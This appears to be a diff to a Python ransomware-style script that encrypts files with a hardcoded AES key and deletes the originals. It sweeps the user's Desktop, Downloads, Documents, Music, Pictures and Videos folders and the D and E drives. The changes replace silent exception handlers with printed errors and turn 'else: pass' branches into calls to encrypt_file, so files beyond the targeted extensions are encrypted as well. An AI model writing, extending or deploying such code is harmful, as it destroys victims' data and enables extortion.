@@ -47,8 +47,8 @@ def encrypt(message, key, key_size=256):
         iv = Random.new().read(AES.block_size)
         cipher = AES.new(key, AES.MODE_CBC, iv)
         return iv + cipher.encrypt(message)
-    except:
-        pass
+    except Exception as e:
+        print(e)
 
 
 def encrypt_file(file_name, key):
@@ -59,8 +59,8 @@ def encrypt_file(file_name, key):
         with open(file_name + ".enc", 'wb') as fo:
             fo.write(enc)
         os.remove(file_name)
-    except:
-        pass
+    except Exception as e:
+        print(e)
 
 
 key = b'\xe0\xce"\xa0E\xbbg\xf1\xe3P\x15\xa2\'&ax'
@@ -231,7 +231,7 @@ def C_drive_desktop():
                             if l.endswith(EXTENSIONS):
                                 encrypt_file(file_input, key)
             else:
-                pass
+                encrypt_file(file_input, key)
 
 
             lol = 'Desktop Folder : '
@@ -302,7 +302,7 @@ def C_drive_downloads():
                             if l.endswith(EXTENSIONS):
                                 encrypt_file(file_input, key)
             else:
-                pass
+                encrypt_file(file_input, key)
 
 
             lol = 'Downloads Folder : '
@@ -373,7 +373,7 @@ def C_drive_documents():
                             if l.endswith(EXTENSIONS):
                                 encrypt_file(file_input, key)
             else:
-                pass
+                encrypt_file(file_input, key)
 
 
             lol = 'Documents Folder : '
@@ -444,7 +444,7 @@ def C_drive_music():
                             if l.endswith(EXTENSIONS):
                                 encrypt_file(file_input, key)
             else:
-                pass
+                encrypt_file(file_input, key)
 
 
             lol = 'Music Folder : '
@@ -515,7 +515,7 @@ def C_drive_pictures():
                             if l.endswith(EXTENSIONS):
                                 encrypt_file(file_input, key)
             else:
-                pass
+                encrypt_file(file_input, key)
 
 
             lol = 'Pictures Folder : '
@@ -586,7 +586,7 @@ def C_drive_videos():
                             if l.endswith(EXTENSIONS):
                                 encrypt_file(file_input, key)
             else:
-                pass
+                encrypt_file(file_input, key)
 
 
             lol = 'Videos Folder : '
@@ -658,7 +658,7 @@ def D_drive():
                             if l.endswith(EXTENSIONS):
                                 encrypt_file(file_input, key)
             else:
-                pass
+                encrypt_file(file_input, key)
 
 
             lol = 'D Drive : '
@@ -729,7 +729,7 @@ def E_drive():
                             if l.endswith(EXTENSIONS):
                                 encrypt_file(file_input, key)
             else:
-                pass
+                encrypt_file(file_input, key)
 
 
             lol = 'E Drive : '
